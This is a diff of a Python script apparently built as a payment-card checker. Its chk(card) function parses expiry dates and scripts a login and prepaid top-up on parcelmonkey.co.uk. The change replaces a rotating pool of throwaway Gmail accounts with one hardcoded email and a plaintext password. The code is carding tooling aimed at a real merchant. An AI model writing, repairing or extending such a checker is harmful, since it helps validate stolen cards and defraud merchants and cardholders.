@@ -21,26 +21,7 @@ def chk(card):
         yy = yy.split("20")[1]
 
     r = requests.session()
-    acc = [
-    'moh5527vbnm1@gmail.com',
-    'moh5527vbnm2@gmail.com', 
-    'moh5527vbnm3@gmail.com',
-    'moh5527vbnm4@gmail.com',
-    'moh5527vbnm5@gmail.com',
-    'moh5527vbnm6@gmail.com',
-    'moh5527vbnm7@gmail.com',
-    'moh5527vbnm8@gmail.com',
-    'moh5527vbnm9@gmail.com',
-    'moh5527vbnm10@gmail.com',
-    'moh5527vbnm11@gmail.com',
-    'moh5527vbnm12@gmail.com',
-    'moh5527vbnm13@gmail.com',
-    'moh5527vbnm14@gmail.com',
-    'moh5527vbnm15@gmail.com'
-]
-
-    email = random.choice(acc)
-
+ 
     # Step 1: Open login page
     headers = {
         'authority': 'www.parcelmonkey.co.uk',
@@ -71,7 +52,7 @@ def chk(card):
     headers['referer'] = 'https://www.parcelmonkey.co.uk/login.php?return=https%3A%2F%2Fwww.parcelmonkey.co.uk%2Fprepay.php%3Fsub%3Dtopup'
 
     data = {
-        'UserEmail': email,
+        'UserEmail':'rhhrhrhth@gmail.com',
         'UserPassword': 'jojo@ALi123',
     }
 
